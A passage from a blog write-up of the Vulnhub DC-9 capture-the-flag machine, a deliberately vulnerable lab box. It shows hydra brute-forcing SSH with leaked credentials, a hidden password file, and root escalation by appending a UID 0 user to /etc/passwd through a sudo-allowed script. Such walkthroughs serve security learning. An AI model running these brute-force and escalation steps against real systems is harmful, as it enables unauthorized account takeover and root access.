the next port.</ol><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-v</span> dc9 7469
+<span class="go">10.0.0.14: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.0.0.14] 7469 (?) : Connection refused
+
+</span><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-v</span> dc9 8475                                                                                       
+<span class="go">10.0.0.14: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.0.0.14] 8475 (?) : Connection refused
+
+</span><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-v</span> dc9 9842                                                                                       
+<span class="go">10.0.0.14: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.0.0.14] 9842 (?) : Connection refused
+
+</span><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-v</span> dc9 22                                                                                         
+<span class="go">10.0.0.14: inverse host lookup failed: Unknown host
+(UNKNOWN) [10.0.0.14] 22 (ssh) open
+SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
+</span></pre></table></code></div></div><p>See that last try? The SSH port is now accessible and greets use with the service banner. I looked for any known vulnerabilities to the service version, yet found nothing.</p><h2 id="hydra">hydra</h2><p>If you recal, we found a list of usernames and passwords in the <em>users</em> database, <em>UserDetails</em> table. We’ll use that list to <a href="https://en.wikipedia.org/wiki/Brute-force_attack">brute-force</a> our way in using <a href="https://tools.kali.org/password-attacks/hydra">hydra</a>.<br /> We first need to create two files for hydra to use - <strong><em>usernames</em></strong> and <strong><em>passwords</em></strong>. Simply copy&amp;past from the sqlmap output to create the files as follow:</p><ul><li>usernames:</ul><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="go">marym
+julied
+fredf
+barneyr
+tomc
+jerrym
+wilmaf
+bettyr
+chandlerb
+joeyt
+rachelg
+rossg
+monicag
+phoebeb
+scoots
+janitor
+janitor2
+</span></pre></table></code></div></div><ul><li>passwords:</ul><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="go">3kfs86sfd
+468sfdfsd2
+4sfd87sfd1
+RocksOff
+TC&amp;TheBoyz
+</span><span class="gp">B8m#</span>48sd
+<span class="go">Pebbles
+BamBam01
+UrAG0D!
+Passw0rd
+</span><span class="gp">yN72#</span>dsd
+<span class="go">ILoveRachel
+3248dsds7s
+smellycats
+YR3BVxxxw87
+Ilovepeepee
+Hawaii-Five-0
+</span></pre></table></code></div></div><p>Now we can lunch hydra against the SSH service, providing the two files as input. We’ll need to wait for hydra to complete the attack and list valid passwords (if any are found):</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>hydra <span class="nt">-L</span> usernames <span class="nt">-P</span> passwords dc9 ssh
+<span class="go">[DATA] attacking ssh://dc9:22/
+[22][ssh] host: dc9   login: chandlerb   password: UrAG0D!
+[22][ssh] host: dc9   login: joeyt   password: Passw0rd
+[22][ssh] host: dc9   login: janitor   password: Ilovepeepee
+1 of 1 target successfully completed, 3 valid passwords found
+</span><span class="c">...
+</span></pre></table></code></div></div><p>Now that we have 3 valid combinations we can login and search for intresting files or directories.<br /> I’ll start with the <strong>janitor</strong> this time. Once logged in I I found a hidden folder containing a paswords file:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>ssh janitor@dc9
+<span class="gp">janitor@dc-9:~$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 16
+drwx------  4 janitor janitor 4096 Jan 21 07:41 .
+drwxr-xr-x 19 root    root    4096 Dec 29  2019 ..
+</span><span class="gp">lrwxrwxrwx  1 janitor janitor    9 Dec 29  2019 .bash_history -&gt;</span><span class="w"> </span>/dev/null
+<span class="go">drwx------  3 janitor janitor 4096 Jan 21 07:41 .gnupg
+drwx------  2 janitor janitor 4096 Dec 29  2019 .secrets-for-putin
+
+</span><span class="gp">janitor@dc-9:~$</span><span class="w"> </span><span class="nb">cd</span> .secrets-for-putin/
+<span class="go">
+</span><span class="gp">janitor@dc-9:~/.secrets-for-putin$</span><span class="w"> </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="go">total 12
+drwx------ 2 janitor janitor 4096 Dec 29  2019 .
+drwx------ 4 janitor janitor 4096 Jan 21 07:41 ..
+-rwx------ 1 janitor janitor   66 Dec 29  2019 passwords-found-on-post-it-notes.txt
+
+</span><span class="gp">janitor@dc-9:~/.secrets-for-putin$</span><span class="w"> </span><span class="nb">cat </span>passwords-found-on-post-it-notes.txt 
+<span class="go">BamBam01
+Passw0rd
+smellycats
+</span><span class="gp">P0Lic#</span>10-4
+<span class="go">B4-Tru3-001
+4uGU5T-NiGHts
+</span></pre></table></code></div></div><p>I decided to test these passwords with our existing <em>usernames</em> file retrieved from the database. The new passwords file is called <em>passwords_from_janitor</em>:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>hydra <span class="nt">-L</span> usernames <span class="nt">-P</span> passwords_from_janitor dc9 ssh 
+<span class="c">...
+</span><span class="go">[DATA] attacking ssh://dc9:22/
+[22][ssh] host: dc9   login: joeyt   password: Passw0rd
+[22][ssh] host: dc9   login: fredf   password: B4-Tru3-001
+1 of 1 target successfully completed, 2 valid passwords found
+</span><span class="c">...
+</span></pre></table></code></div></div><p>And now we have a new username:password combination. Let’s try to use it, I suspect it will be our way to root.</p><h1 id="privilege-escalation">Privilege Escalation</h1><h2 id="sudo--l">sudo -l</h2><p>Once logged in as <strong><em>fredf</em></strong> we can check if he have any sudo permissions using <code class="language-console highlighter-rouge"><span class="go">sudo -l</span></code> command (Additional details regarding this command can be found in this post Summary):</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for fredf on dc-9:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User fredf may run the following commands on dc-9:
+    (root) NOPASSWD: /opt/devstuff/dist/test/test
+</span></pre></table></code></div></div><p>Interesting. Let’s look into that test file. I tried to analyze it using <code class="language-console highlighter-rouge"><span class="go">strings</span></code> command but it’s a bit messy. So I ran it instead :)</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>./test 
+<span class="go">Usage: python test.py read append
+</span></pre></table></code></div></div><p>Loogs like the binary file is running some sort of Python file called <em>test.py</em>. Let’s find it using <code class="language-console highlighter-rouge"><span class="go">find</span></code> command:</p><ul><li><code class="language-console highlighter-rouge"><span class="go">/</span></code> is the root path to start the scan from<li><code class="language-console highlighter-rouge"><span class="go">-type f</span></code> search for file (d for directory)<br /> <code class="language-console highlighter-rouge"><span class="go">-name 'test.py'</span></code> file name flag.txt. we can use wildcard as well, e.g. ‘<em>flag</em>’<li><code class="language-console highlighter-rouge"><span class="gp">2&gt;</span>/dev/null</code> this will produce a cleaner output as it will discard errors, such as permission errors.</ul><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>find / <span class="nt">-name</span> <span class="s2">"test.py"</span> <span class="nt">-type</span> f 2&gt;/dev/null
+<span class="go">/opt/devstuff/test.py
+/usr/lib/python3/dist-packages/setuptools/command/test.py
+</span></pre></table></code></div></div><p>Reading the Python file, it seems that the script accepts two <a href="https://www.computerhope.com/jargon/p/positional-parameter.htm">positional parameters</a> and appends <strong>the content</strong> of the first file into the content of the second file.</p><dl><dt>Rememeber:<dd>We can run the script with sudo privileges which means we can read/write root files.</dl><p>One idea I had was to overwrite the Python file with my own, malicious file. It seems the user we use doesn’t have the required permissions to write into the <code class="language-console highlighter-rouge"><span class="go">/opt/devstuff</span></code> directory therefore we can’t replace the <code class="language-console highlighter-rouge"><span class="go">test.py</span></code> file.</p><p>Another path is to try and add a new <strong><em>root user</em></strong> by injecting/concatinating new record to the <code class="language-console highlighter-rouge"><span class="go">/etc/passwd</span></code> file using the test script. Additional details regarding this command can be found in this post Summary</p><p>First we need to choose a password, salt it and hash the result. openssl to the rescue.<br /> Flags:</p><ul><li><code class="language-console highlighter-rouge"><span class="go">-1</span></code> what hashing algorithm to use. In our use case it doesnt matter, therefore we use MD5 which should be avoided in real world PT as it is not secure.<li><code class="language-console highlighter-rouge"><span class="go">-salt salt</span></code> string to use as salt. I choose the string salt<li><code class="language-console highlighter-rouge"><span class="go">password</span></code> clear text password we would like to use.</ul><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> salt password
+<span class="gp">$</span>1<span class="nv">$salt$qJH7</span>.N4xYta3aEG/dfqo/0
+</pre></table></code></div></div><p>We need to put the above string into a file. If you recal, our user has no writing permissions to the <code class="language-console highlighter-rouge"><span class="go">/opt/devstuff</span></code> directory we’re in. Therefore that we need to find a directory we can write to. Easiest option is to use <code class="language-console highlighter-rouge"><span class="go">/tmp</span></code>. I’ll call my file <code class="language-console highlighter-rouge"><span class="go">my_user</span></code>.<br /> In order to stay aligned with <code class="language-console highlighter-rouge"><span class="go">/etc/passwd</span></code> file format, we need to add some extra details:</p><ul><li>username - <code class="language-console highlighter-rouge"><span class="go">hful</span></code> in this case<li>salted + hashed password - the string created by openssl<li>UID - as we want to create root, we need to use <code class="language-console highlighter-rouge"><span class="go">0</span></code><li>GID - same as for UID<li>home directory - we’ll use <code class="language-console highlighter-rouge"><span class="go">/root</span></code><li>shell - I prefer <code class="language-console highlighter-rouge"><span class="go">bash</span></code>, you can also use <code class="language-console highlighter-rouge"><span class="go">sh</span></code></ul><p>Which leave us with the following file content:</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /tmp/my_user
+<span class="gp">`hful:$</span>1<span class="nv">$salt$qJH7</span>.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash<span class="sb">`</span>
+</pre></table></code></div></div><p>Now we can execute the <strong><em>test</em></strong> script as sudo<br /> <code class="language-console highlighter-rouge"><span class="go">sudo ./test /tmp/my_user /etc/passwd</span></code></p><p>Verify our new user was added</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">cat</span> /etc/passwd
+<span class="c">...
+</span><span class="go">janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash
+</span><span class="gp">hful:$</span>1<span class="nv">$salt$qJH7</span>.N4xYta3aEG/dfqo/0:0:0::/root:/bin/bash
+</pre></table></code></div></div><p>Switch to the new user and verify we’re root.</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre><span class="gp">fredf@dc-9:/opt/devstuff/dist/test$</span><span class="w"> </span>su hful
+<span class="go">Password: 
+</span><span class="gp">root@dc-9:/opt/devstuff/dist/test#</span><span class="w"> </span><span class="nb">id</span>
+<span class="go">uid=0(root) gid=0(root) groups=0(root)
+</span></pre></table></code></div></div><p>Find and print the flag</p><div class="language-console highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span><span class="nb">ls</span> /root
+<span class="go">theflag.txt
+</span><span class="gp">root@dc-9:/opt/devstuff/dist/test#</span><span class="w"> </span><span class="nb">cat</span> /root/theflag.txt 
+<span class="go">
+
+███╗   ██╗██╗ ██████╗███████╗    ██╗    ██╗ ██████╗ ██████╗ ██╗  ██╗██╗██╗██╗
+████╗  ██║██║██╔════╝██╔════╝    ██║    ██║██╔═══██╗██╔══██╗██║ ██╔╝██║██║██║
+██╔██╗ ██║██║██║     █████╗      ██║ █╗ ██║██║   ██║██████╔╝█████╔╝ ██║██║██║
+██║╚██╗██║██║██║     ██╔══╝      ██║███╗██║██║   ██║██╔══██╗██╔═██╗ ╚═╝╚═╝╚═╝
+██║ ╚████║██║╚██████╗███████╗    ╚███╔███╔╝╚██████╔╝██║  ██║██║  ██╗██╗██╗██╗
+╚═╝  ╚═══╝╚═╝ ╚═════╝╚══════╝     ╚══╝╚══╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝╚═╝
+                                                                             
+Congratulations - you have done well to get to this point.
+
+Hope you enjoyed DC-9.  Just wanted to send out a big thanks to all those
+who have taken the time to complete the various DC challenges.
+
+I also want to send out a big thank you to the various members of @m0tl3ycr3w .
+
+They are an inspirational bunch of fellows.
+
+Sure, they might smell a bit, but...just kidding.  :-)
+
+Sadly, all things must come to an end, and this will be the last ever
+challenge in the DC series.
+
+So long, and thanks for all the fish.
+</span></pre></table></code></div></div><h1 id="summary">Summary</h1><p>This was a great machine and I found myself using Google multiple times, which means I LEARND SOMETHING NEW. Success!</p><h2 id="reading-materials">Reading Materials</h2><ul><li>sudo -l - I see this technice used in many CTFs, It’s simple to run and easy to understnad. Make sure you feel comfortable with it. <a href="https://www.explainshell.com/explain?cmd=sudo+-l">READ</a>, <a href="https://medium.com/better-programming/becoming-root-through-misconfigured-sudo-7b68e731d1f5">READ2</a><li>/etc/passwd file <a href="https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/">READING Materials</a></ul></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/vulnhub/'>Vulnhub</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/port-knocking/" class="post-tag no-text-decoration" >port-knocking</a> <a href="/tags/sqli/" class="post-tag no-text-decoration" >sqli</a> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/lfi/" class="post-tag no-text-decoration" >lfi</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=DC: 9 - Hacking Walkthroughs, Writeups and Guides&url=https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=DC: 9 - Hacking Walkthroughs, Writeups and Guides&u=https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=DC: 9 - Hacking Walkthroughs, Writeups and Guides&url=https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://hummus-ful.github.io/vulnhub/2021/01/22/DC-9.html" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/oscp/2021/01/26/OSCP_List.html">Tony (@TJ Null) list to PWK/OSCP</a><li><a href="/try-hack-me/2021/01/04/Bolt.html">Bolt</a><li><a href="/try-hack-me/2021/01/15/Pickle_Rick.html">Pickle Rick</a><li><a href="/vulnhub/2021/01/17/Kioptrix_1.html">Kioptrix: Level 1 (#1)</a><li><a href="/tutorials/2021/01/17/Kioptrix_on_VirtualBox.html">How-To: Run Kioptrix On VirtualBox</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/google-fu/">google-fu</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/samba/">samba</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/try-hack-me/">try-hack-me</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/try-hack-me/2021/01/14/Simple_CTF.html"><div class="card-body"> <span class="timeago small" > Jan 14 <i class="unloaded">2021-01-14T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Simple CTF</h3><div class="text-muted small"><p> This is a writeup for the Simple CTF challenge on Try-Hack-Me where you’ll need to scan, exploit SQLi vulnerability and escalate your privileges to root. Rated as Easy/Beginner level machine. Int...</p></div></div></a></div><div class="card"> <a href="/oscp/2021/01/26/OSCP_List.html"><div class="card-body"> <span class="timeago small" > Jan 26 <i class="unloaded">2021-01-26T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tony (@TJ Null) list to PWK/OSCP</h3><div class="text-muted small"><p> Tony (@TJ Null) list to PWK/OSCP [Last update: 2021-05-03] The below list is based on Tony’s (@TJ_Null) list of vulnerable machines. As He wrote: The boxes that are contained in this list sho...</p></div></div></a></div><div class="card"> <a href="/vulnhub/2021/01/17/Kioptrix_1.html"><div class="card-body"> <span class="timeago small" > Jan 17 <i class="unloaded">2021-01-17T00:00:00+02:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Kioptrix: Level 1 (#1)</h3><div class="text-muted small"><p> Kioptrix: Level 1, a vulnerable-by-design virtual machine from Vulnhub, rated as Easy/Beginner level machine. We’ll try to get root shell and obtain flag. Introduction This Kioptrix: Level 1 VM I...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/tutorials/2021/01/17/Kioptrix_on_VirtualBox.html" class="btn btn-outline-primary"><p>How-To: Run Kioptrix On VirtualBox</p></a> <a href="/vulnhub/2021/01/25/Kioptrix_2.html" class="btn btn-outline-primary"><p>Kioptrix: Level 1.1 (#2)</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/hummus_ful">Hummus_Ful</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/google-fu/">google fu</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/samba/">samba</a> <a class="post-tag" href="/tags/searchsploit/">searchsploit</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/try-hack-me/">try hack me</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://hummus-ful.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
